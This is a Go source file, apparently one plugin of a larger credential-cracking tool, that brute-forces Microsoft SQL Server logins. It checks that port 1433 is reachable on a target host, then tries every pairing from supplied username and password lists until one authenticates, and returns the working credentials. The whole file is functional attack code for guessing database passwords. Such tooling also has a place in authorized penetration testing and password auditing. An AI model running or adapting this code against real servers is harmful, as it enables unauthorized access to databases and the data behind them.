package brute

import (
	"context"
	"database/sql"
	"fmt"
	"net"
	"strconv"
	"time"

	_ "github.com/microsoft/go-mssqldb"
)

// MSSQLPlugin MSSQL爆破插件
type MSSQLPlugin struct{}

func (p *MSSQLPlugin) Name() string     { return "mssql" }
func (p *MSSQLPlugin) DefaultPort() int { return 1433 }

func (p *MSSQLPlugin) Probe(ctx context.Context, host string, port int) bool {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), 3*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()
	return true
}

func (p *MSSQLPlugin) Brute(ctx context.Context, host string, port int, usernames, passwords []string, timeout int) *BruteResult {
	for _, username := range usernames {
		for _, password := range passwords {
			select {
			case <-ctx.Done():
				return &BruteResult{Host: host, Port: port, Service: "mssql", Success: false, Message: "canceled"}
			default:
			}

			ok := testMSSQL(ctx, host, port, username, password, timeout)
			if ok {
				return &BruteResult{
					Host:     host,
					Port:     port,
					Service:  "mssql",
					Username: username,
					Password: password,
					Success:  true,
					Message:  "Authentication successful",
				}
			}
		}
	}
	return &BruteResult{Host: host, Port: port, Service: "mssql", Success: false, Message: "Authentication failed"}
}

// testMSSQL 测试MSSQL连接
func testMSSQL(ctx context.Context, host string, port int, username, password string, timeout int) bool {
	dsn := fmt.Sprintf("server=%s;port=%d;database=master;user id=%s;password=%s;encrypt=disable;TrustServerCertificate=true;Connection Timeout=%d",
		host, port, username, password, timeout)

	db, err := sql.Open("sqlserver", dsn)
	if err != nil {
		return false
	}
	defer db.Close()
	db.SetConnMaxLifetime(time.Duration(timeout) * time.Second)

	ctx, cancel := context.WithTimeout(ctx, time.Duration(timeout)*time.Second)
	defer cancel()

	if err := db.PingContext(ctx); err != nil {
		return false
	}
	return true
}
